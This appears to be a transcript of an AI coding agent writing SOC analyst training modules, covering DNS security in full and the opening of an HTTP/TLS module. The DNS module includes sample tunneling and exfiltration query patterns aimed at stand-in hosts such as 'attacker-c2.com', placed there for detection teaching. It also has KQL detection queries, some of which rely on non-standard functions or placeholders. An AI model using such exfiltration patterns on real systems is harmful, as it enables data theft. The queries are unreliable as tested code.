    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "in_progress",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 154.5s)

_Thinking:_

Now I'll create Module 10 - DNS Security.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 10: DNS Security\n\n**Priority: P1 — Critical for C2 detection, phishing, data exfil. L1 investigates DNS daily.**\n\n---\n\n## 10.1 DNS Fundamentals\n\n### What is DNS?\n**Domain Name System** — Hierarchical, distributed database mapping human-readable names to IP addresses (and more). The \"phone book\" of the internet.\n\n### DNS Hierarchy\n```\n. (Root) → 13 Root Server Clusters (a.root-servers.net → m.root-servers.net)\n    │\n    ├── .com (TLD) → Verisign\n    ├── .org (TLD) → PIR\n    ├── .net (TLD) → Verisign\n    ├── .edu (TLD) → Educause\n    ├── .gov (TLD) → DOT\n    ├── .io, .co, .xyz, .top, .tk, .ml, .ga, .cf (ccTLD/gTLD) → Various\n    │\n    └── example.com (Second-Level Domain) → Organization\n            │\n            ├── www.example.com (A/AAAA)\n            ├── mail.example.com (MX)\n            ├── vpn.example.com (A)\n            ├── _kerberos._tcp.example.com (SRV)\n            └── sub.domain.example.com (delegation)\n```\n\n### DNS Message Format\n```\n┌─────────────────────────────────────────────────────────────┐\n│ Header (12 bytes)                                           │\n├─────────────────────────────────────────────────────────────┤\n│ Question Section (1+ entries)                               │\n├─────────────────────────────────────────────────────────────┤\n│ Answer Section (0+ RRs)                                     │\n├─────────────────────────────────────────────────────────────┤\n│ Authority Section (0+ RRs)                                  │\n├─────────────────────────────────────────────────────────────┤\n│ Additional Section (0+ RRs)                                 │\n└─────────────────────────────────────────────────────────────┘\n```\n\n**Header Fields**:\n| Field | Size | Description |\n|-------|------|-------------|\n| **Transaction ID** | 16 bits | Matches request/response (spoofing protection) |\n| **Flags** | 16 bits | QR, Opcode, AA, TC, RD, RA, Z, RCODE |\n| **Questions** | 16 bits | Number of questions |\n| **Answer RRs** | 16 bits | Number of answer records |\n| **Authority RRs** | 16 bits | Number of authority records |\n| **Additional RRs** | 16 bits | Number of additional records |\n\n**Flags Detail**:\n```\nQR (1)  | Opcode (4) | AA | TC | RD | RA | Z (3) | RCODE (4)\n 0=Query  0=Standard  1=Auth  1=Trunc  1=Recurse  1=RecurseAvail  Reserved  0=NoError\n 1=Resp   1=Inverse   Ans   ated  Desired   Available             3=NameError (NXDOMAIN)\n                                             2=ServFail\n                                             5=Refused\n```\n\n---\n\n## 10.2 Critical DNS Record Types\n\n| Type | Value | Purpose | SOC Relevance |\n|------|-------|---------|---------------|\n| **A** | 1 | IPv4 address | Standard resolution |\n| **AAAA** | 28 | IPv6 address | IPv6 tracking |\n| **CNAME** | 5 | Canonical name (alias) | **CDN, tracking, subdomain takeover** |\n| **MX** | 15 | Mail exchange | **Email routing, phishing infrastructure** |\n| **TXT** | 16 | Text data | **SPF, DKIM, DMARC, verification, C2** |\n| **NS** | 2 | Name server | **Delegation, hijacking** |\n| **PTR** | 12 | Reverse lookup (IP→Name) | **Recon, logging** |\n| **SOA** | 6 | Start of Authority | Zone metadata, version |\n| **SRV** | 33 | Service location | **Kerberos, LDAP, SIP, service discovery** |\n| **CAA** | 257 | Certification Authority Auth | **Cert issuance control** |\n| **DNAME** | 39 | Delegation name | Subtree alias (rare) |\n| **DS** | 43 | Delegation Signer | **DNSSEC** |\n| **DNSKEY** | 48 | DNS Key | **DNSSEC** |\n| **RRSIG** | 46 | RRset Signature | **DNSSEC** |\n\n---\n\n## 10.3 DNS Resolution Process\n\n### Recursive Resolution (Client → Recursive Resolver)\n```\nClient                                    Recursive Resolver\n   │                                          │\n   ├─ Query: www.example.com A ──────────────►│\n   │                                          │\n   │                                          ├─ Check cache\n   │                                          ├─ If miss: Query Root (.)\n   │                                          │   │\n   │                                          │   ├─ Root Referral: .com NS + Glue\n   │                                          │   │\n   │                                          │   ├─ Query .com TLD\n   │                                          │   │   │\n   │                                          │   │   ├─ TLD Referral: example.com NS\n   │                                          │   │   │\n   │                                          │   │   ├─ Query example.com Auth NS\n   │                                          │   │   │   │\n   │                                          │   │   │   ├─ Answer: www.example.com A 93.184.216.34\n   │                                          │   │   │   │\n   │                                          │   │   │◄──┤\n   │                                          │   │◄─────┤\n   │                                          │◄────────┤\n   │◄─ Response: 93.184.216.34 ───────────────┤\n   │                                          │\n```\n\n### Iterative Resolution (Resolver → Authoritative)\n- Resolver does the work, queries each level\n- Authoritative servers only answer for their zone\n\n### Caching & TTL\n| Record | Typical TTL | SOC Note |\n|--------|-------------|----------|\n| A/AAAA | 300-3600s (5min-1hr) | Low TTL = fast flux, agile infrastructure |\n| CNAME | 3600-86400s | Chain length matters |\n| MX | 3600-86400s | |\n| NS | 86400s+ (1 day+) | |\n| TXT | 3600s | SPF/DKIM/DMARC |\n| **Negative (NXDOMAIN)** | SOA MINIMUM (often 3600s) | NXDOMAIN caching |\n\n**TTL = Time To Live**. Attackers use **low TTL (30-60s)** for fast flux / rapid IP rotation.\n\n---\n\n## 10.4 DNS Security Threats\n\n### 1. DNS Tunneling (Data Exfil / C2)\n**Mechanism**: Encode data in subdomains (queries) or TXT/NULL records (responses).\n```\nExfil:  <base64(data)>.attacker.com     → Query\nC2:     attacker.com TXT <base64(cmd)>  → Response\n```\n**Indicators**:\n- High query volume from single host\n- Long subdomains (>50 chars), high entropy\n- Unusual record types (TXT, NULL, CNAME for data)\n- Regular intervals (beaconing)\n- NXDOMAIN responses (data in query only)\n\n### 2. Domain Generation Algorithms (DGA)\n**Mechanism**: Malware generates pseudorandom domains daily → C2 registers one → Malware resolves until hit.\n**Indicators**:\n- High NXDOMAIN rate\n- Algorithmic domain patterns (entropy, length, consonant/vowel ratio)\n- Many domains, few resolutions\n- Newly registered domains (NRD)\n- Same seed → predictable (sinkholing possible)\n\n**Common DGA Families**: Necurs, Conficker, Gameover Zeus, Matsnu, Pushdo, Ramnit.\n\n### 3. Fast Flux\n**Mechanism**: Single domain → Many IPs (round-robin, low TTL) → Hide C2 behind compromised hosts.\n**Types**:\n- **Single Flux**: Domain ↔ Multiple IPs (A records)\n- **Double Flux**: Domain ↔ Multiple IPs + NS records also flux\n**Indicators**:\n- Very low TTL (< 300s, often 30-60s)\n- Many A records for single domain\n- IPs geographically dispersed, unrelated ASNs\n- High churn (IPs change frequently)\n\n### 4. DNS Hijacking / Cache Poisoning\n**Mechanism**: Corrupt resolver cache → Redirect traffic to attacker.\n**Vectors**:\n- **Kaminsky Attack**: Race condition, predict TXID + port\n- **Rogue DHCP/WPAD**: Push malicious DNS (Option 6, 252)\n- **Compromised Resolver**: ISP/Enterprise DNS hacked\n- **Registrar/Registry Compromise**: Change NS records\n**Indicators**:\n- Unexpected IPs for known domains\n- Certificate mismatches (TLS)\n- User reports of phishing/redirection\n\n### 5. Subdomain Takeover\n**Mechanism**: CNAME points to external service (GitHub Pages, AWS S3, Azure, Heroku) → Service deleted → Attacker claims name → Serves content on victim's subdomain.\n**Detection**:\n- CNAME to known providers (github.io, s3.amazonaws.com, azurewebsites.net, herokudns.com)\n- HTTP 404 / \"No such app\" / \"Repository not found\"\n- Monitor external CNAME targets\n\n### 6. DNS Reconnaissance\n| Technique | Purpose |\n|-----------|---------|\n| **Zone Transfer (AXFR/IXFR)** | Enumerate all records (misconfigured NS) |\n| **Reverse Lookup (PTR)** | Map IP ranges |\n| **Certificate Transparency (CT) Logs** | Find subdomains via certs |\n| **DNS Bruteforce / Dictionary** | Find hidden subdomains |\n| **Passive DNS** | Historical resolution data |\n| **SPF/DMARC/TXT Enumeration** | Discover mail infrastructure |\n\n---\n\n## 10.5 DNS Security Controls\n\n| Control | Description | Deployment |\n|---------|-------------|------------|\n| **DNSSEC** | Cryptographic signing of zones (RRSIG, DNSKEY, DS, NSEC/NSEC3) | Authoritative + Validating Resolver |\n| **DNS over TLS (DoT)** | DNS over TCP 853 (TLS) | Recursive Resolver |\n| **DNS over HTTPS (DoH)** | DNS over HTTPS 443 | Browser/OS/Resolver |\n| **DNSCrypt** | Encrypted DNS (proprietary) | Client → Resolver |\n| **Response Rate Limiting (RRL)** | Limit authoritative responses to same client | Authoritative Server |\n| **0x20 Bit Randomization** | Randomize case in query for entropy | Recursive Resolver |\n| **Source Port Randomization** | Randomize UDP source port | Recursive Resolver |\n| **RPZ (Response Policy Zones)** | Block/redirect malicious domains at resolver | Recursive Resolver |\n| **Sinkholing** | Redirect malicious domains to controlled server | Resolver / Network |\n\n---\n\n## 10.6 DNS Investigation Workflow for L1\n\n### Alert: \"Suspicious DNS Activity - Potential Tunneling\"\n```\n1. IDENTIFY SOURCE\n   - Host: WORKSTN-047 (Marketing)\n   - User: j.smith@company.com\n   - Time: 2024-01-15 03:12:47 UTC\n   - Resolver: Corporate DNS (10.10.10.53)\n\n2. QUERY DNS LOGS (Zeek dns.log / Infoblox / Cisco Umbrella / Microsoft DNS)\n   - Filter: src_ip=10.10.20.47, time window T-1h to T+1h\n   \n3. ANALYZE PATTERNS\n   - Query count: 2,847 queries in 1 hour (baseline: ~200/hr)\n   - Unique domains: 1,203\n   - Record types: 95% TXT, 5% A\n   - Subdomain length: avg 62 chars, max 187\n   - Entropy: avg 4.2 (high)\n   - Response codes: 89% NXDOMAIN, 11% NOERROR\n   - Intervals: Regular ~5 seconds (beaconing)\n\n4. EXAMPLE QUERIES\n   - a1b2c3d4e5f6g7h8i9j0.attacker-c2.com TXT\n   - k9l8m7n6o5p4q3r2s1t0.attacker-c2.com TXT\n   - (decoded TXT: \"cmd: whoami; sleep 5\")\n\n5. THREAT INTEL\n   - Domain: attacker-c2.com\n   - Registered: 2024-01-10 (5 days ago)\n   - Registrar: Namecheap\n   - NS: ns1.bulletproof-hosting.net\n   - VT: 12/92 (C2, tunneling)\n   - Passive DNS: Seen with Cobalt Strike, PoshC2\n\n6. CORRELATE\n   - Same host: Sysmon EID 22 shows PowerShell making DNS queries\n   - Process: powershell.exe (PID 5102)\n   - Network: No HTTP/HTTPS to domain (DNS-only C2)\n   - User: j.smith clicked phishing link at 03:10 (email logs)\n\n7. CLASSIFY\n   - TRUE POSITIVE: DNS Tunneling C2 (PoshC2)\n   - MITRE: T1071.004 (DNS), T1059.001 (PowerShell)\n   - ESCALATE P2\n\n8. CONTAINMENT\n   - Block domain at DNS resolver (RPZ)\n   - Block domain at firewall/proxy\n   - Isolate host (EDR)\n   - Reset user password (credential theft likely)\n```\n\n---\n\n## 10.7 DNS Log Sources for SOC\n\n| Source | Pros | Cons |\n|--------|------|------|\n| **Zeek (Bro) dns.log** | Full protocol parsing, all record types, timestamps | Requires sensor deployment |\n| **Infoblox / BlueCat / Microsoft DNS Debug Logs** | Authoritative + Recursive, native | Verbose, performance impact |\n| **Cisco Umbrella / OpenDNS** | Cloud-delivered, threat intel integrated | Cloud only, cost |\n| **Firewall/Proxy DNS Logs** | Correlated with network flow | May miss internal-only |\n| **Sysmon EID 22** | Process context (which exe made query) | Endpoint only |\n| **Passive DNS (Farsight, CIRCL, VirusTotal)** | Historical, global view | Not real-time, subscription |\n\n---\n\n## 10.8 DNS Query Patterns — Detection Queries\n\n### High Entropy / Long Subdomains (DGA/Tunneling)\n```kql\nDnsEvents\n| extend Subdomain = split(QueryName, \".\")[0]\n| extend Entropy = calculate_shannon_entropy(Subdomain)\n| extend Length = strlen(Subdomain)\n| where Entropy > 3.5 and Length > 30\n| summarize Count=count(), AvgEntropy=avg(Entropy), MaxLen=max(Length), Domains=make_set(QueryName) \n  by SrcIp, User, bin(TimeGenerated, 1h)\n| where Count > 50\n```\n\n### Fast Flux Detection\n```kql\nDnsEvents\n| where QueryType == \"A\" and ResponseCode == \"NOERROR\"\n| summarize Ips=make_set(ResponseIp), TTLs=make_set(TTL), Count=count() \n  by QueryName, bin(TimeGenerated, 1h)\n| where Count > 10 and array_length(TTLs) > 1 and min(TTLs) < 300\n| extend UniqueASNs = ... (enrich IPs with ASN)\n```\n\n### DNS Tunneling (TXT/NULL, High Volume, NXDOMAIN)\n```kql\nDnsEvents\n| where QueryType in (\"TXT\", \"NULL\", \"CNAME\") or ResponseCode == \"NXDOMAIN\"\n| summarize QueryCount=count(), NxCount=countif(ResponseCode==\"NXDOMAIN\"), \n            UniqueDomains=dcount(QueryName), AvgSubLen=avg(strlen(split(QueryName, \".\")[0]))\n  by SrcIp, bin(TimeGenerated, 1h)\n| where QueryCount > 500 and NxCount > QueryCount * 0.5\n```\n\n### Newly Registered Domains (NRD)\n```kql\nDnsEvents\n| join kind=inner (\n    ThreatIntel\n    | where DomainAgeDays < 30\n    | project Domain, Registrar, RegistrationDate\n) on $left.QueryName == $right.Domain\n| where QueryType in (\"A\", \"AAAA\", \"CNAME\")\n```\n\n---\n\n## 10.9 Interview Questions for This Module\n\n1. **Explain the DNS resolution process (recursive vs iterative).**\n   - Client asks recursive resolver → Resolver queries root → TLD → Authoritative → Returns answer. Iterative = resolver does the work.\n\n2. **What are the most common DNS record types and their purpose?**\n   - A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), TXT (text/SPF/DKIM), NS (nameserver), PTR (reverse), SRV (service location), SOA (zone authority).\n\n3. **What is DNS tunneling and how do you detect it?**\n   - Encode data in DNS queries/responses (subdomains, TXT records). Detect: high volume, high entropy subdomains, unusual record types, regular intervals, NXDOMAIN heavy.\n\n4. **What is a DGA (Domain Generation Algorithm) and indicators?**\n   - Malware generates domains algorithmically. Indicators: high NXDOMAIN rate, algorithmic patterns (entropy, length), many domains few resolutions, newly registered.\n\n5. **What is Fast Flux and how does it work?**\n   - Single domain resolves to many IPs with low TTL (round-robin). Hides C2 behind compromised hosts. Single flux (A records) or double flux (NS also flux).\n\n6. **What is subdomain takeover and how do you detect it?**\n   - CNAME to external service (GitHub, AWS, Azure) → Service deleted → Attacker claims name. Detect: CNAME to known providers + HTTP 404/\"No such app\".\n\n7. **What is DNSSEC and what records does it use?**\n   - Cryptographic signing of zones. Records: DNSKEY (public key), RRSIG (signature), DS (delegation signer), NSEC/NSEC3 (authenticated denial).\n\n8. **Difference between DoT (DNS over TLS) and DoH (DNS over HTTPS)?**\n   - DoT: DNS over TCP 853 with TLS. DoH: DNS over HTTPS 443. DoH blends with web traffic, harder to block/inspect.\n\n9. **What is RPZ (Response Policy Zone) and how is it used?**\n   - Policy zones at recursive resolver to block/redirect malicious domains (sinkhole, NXDOMAIN, walled garden).\n\n10. **How do you correlate DNS alerts with endpoint telemetry?**\n    - Sysmon EID 22 (DNS Query) shows Process/Image/User making query. Match query name/timestamp to DNS logs. Identify malicious process (PowerShell, rundll32, custom).\n\n---\n\n## 10.10 Study Checklist for Module 10\n\n- [ ] Draw DNS hierarchy and resolution flow\n- [ ] List 12+ record types with purpose and SOC relevance\n- [ ] Explain recursive vs iterative resolution\n- [ ] Describe 6 DNS threats: Tunneling, DGA, Fast Flux, Hijacking, Subdomain Takeover, Recon\n- [ ] List DNS security controls (DNSSEC, DoT, DoH, RPZ, Sinkholing)\n- [ ] Perform DNS investigation workflow (source → logs → patterns → TI → correlate → classify)\n- [ ] Write KQL for: High entropy, Fast Flux, Tunneling, NRD\n- [ ] Compare DNS log sources (Zeek, Infoblox, Umbrella, Sysmon, Passive)\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 11 — HTTP/HTTPS/TLS*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/10-dns-security.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 33.9s)

_Thinking:_

Module 10 is complete. Now I'll continue with Module 11 - HTTP/HTTPS/TLS.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "in_progress"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "in_progress",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 1797.9s)

_Thinking:_

Now I'll create Module 11 - HTTP/HTTPS/TLS.

---

## User

continue

---

## Assistant (Build · Nemotron 3 Ultra Free · 6.1s)

---

## User

continue

---

## Assistant (Build · Nemotron 3 Ultra (free) · 153.9s)

_Thinking:_

The user wants me to continue creating the modules. I was working on Module 11 - HTTP/HTTPS/TLS. Let me continue with that and then proceed through the remaining modules.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 11: HTTP/HTTPS/TLS\n\n**Priority: P1 — Web traffic = majority of alerts. L1 must read proxy logs, understand TLS.**\n\n---\n\n## 11.1 HTTP Fundamentals\n\n### HTTP Request/Response Model\n```\nClient                                    Server\n   │                                          │\n   ├─ REQUEST ──────────────────────────────►│\n   │  GET /api/users HTTP/1.1                 │\n   │  Host: api.example.com                   │\n   │  User-Agent: Mozilla/5.0...              │\n   │  Authorization: Bearer <token>           │\n   │  Cookie: session=abc123                  │\n   │  Content-Type: application/json          │\n   │                                          │\n   │◄─ RESPONSE ─────────────────────────────┤\n   │  HTTP/1.1 200 OK                         │\n   │  Content-Type: application/json          │\n   │  Set-Cookie: session=xyz789; Secure      │\n   │  X-Frame-Options: DENY                   │\n   │                                          │\n   │  {\"users\": [...]}                        │\n```\n\n### HTTP Methods (Verbs)\n| Method | Purpose | Idempotent | Body Allowed | SOC Relevance |\n|--------|---------|------------|--------------|---------------|\n| **GET** | Retrieve resource | Yes | No | **Recon, data exfil (params in URL)** |\n| **POST** | Submit data / Create | No | Yes | **Login, upload, C2, web shells** |\n| **PUT** | Replace resource | Yes | Yes | File upload, config change |\n| **DELETE** | Remove resource | Yes | No | Data destruction |\n| **HEAD** | Headers only | Yes | No | Recon, scanning |\n| **OPTIONS** | Allowed methods | Yes | No | CORS preflight, recon |\n| **PATCH** | Partial update | No | Yes | API abuse |\n| **CONNECT** | Tunnel (HTTPS proxy) | No | No | **Proxy tunneling, C2** |\n| **TRACE** | Echo request | Yes | No | **XST (Cross-Site Tracing)** |\n\n### HTTP Status Codes\n| Code | Category | Meaning | SOC Relevance |\n|------|----------|---------|---------------|\n| **1xx** | Informational | Continue, Switching Protocols | Upgrade attacks |\n| **200** | Success | OK | Normal |\n| **201** | Success | Created | Upload success |\n| **204** | Success | No Content | API, C2 heartbeat |\n| **301** | Redirect | Moved Permanently | Phishing, SEO poisoning |\n| **302** | Redirect | Found (Temporary) | **Phishing, open redirect** |\n| **304** | Redirect | Not Modified | Caching |\n| **307/308** | Redirect | Temporary/Permanent (preserve method) | |\n| **400** | Client Error | Bad Request | Malformed, fuzzing |\n| **401** | Client Error | **Unauthorized** (auth required) | **Brute force, credential stuffing** |\n| **403** | Client Error | **Forbidden** (auth known, no perms) | **Access control testing, WAF block** |\n| **404** | Client Error | Not Found | **Recon, directory traversal, scanning** |\n| **405** | Client Error | Method Not Allowed | API abuse |\n| **429** | Client Error | Too Many Requests | **Rate limiting, DoS** |\n| **500** | Server Error | Internal Server Error | **Exploit crash, WAF bypass** |\n| **502** | Server Error | Bad Gateway | Proxy issues |\n| **503** | Server Error | Service Unavailable | **DoS, maintenance** |\n| **504** | Server Error | Gateway Timeout | |\n\n### HTTP Headers — Security Critical\n| Header | Direction | Purpose | SOC Relevance |\n|--------|-----------|---------|---------------|\n| **Host** | Request | Target domain (virtual hosting) | **Host header injection** |\n| **User-Agent** | Request | Client identifier | **Anomalous UA, scanner signatures** |\n| **Referer** | Request | Previous page | **CSRF, tracking, leak** |\n| **Origin** | Request | CORS origin | **CORS misconfig** |\n| **Authorization** | Request | Credentials (Basic, Bearer, etc.) | **Token leakage, credential theft** |\n| **Cookie** | Request | Session/state | **Session hijacking, fixation** |\n| **Set-Cookie** | Response | Set client cookie | **Secure/HttpOnly/SameSite flags** |\n| **Content-Type** | Both | MIME type | **Upload validation, XSS** |\n| **Content-Length** | Both | Body size | **Smuggling, truncation** |\n| **Transfer-Encoding** | Both | Chunked, gzip | **Request smuggling** |\n| **X-Forwarded-For** | Request | Original client IP (proxy) | **IP spoofing, geo bypass** |\n| **X-Forwarded-Proto** | Request | Original protocol | **SSL stripping detection** |\n| **Server** | Response | Server software/version | **Recon, version disclosure** |\n| **X-Powered-By** | Response | Framework | 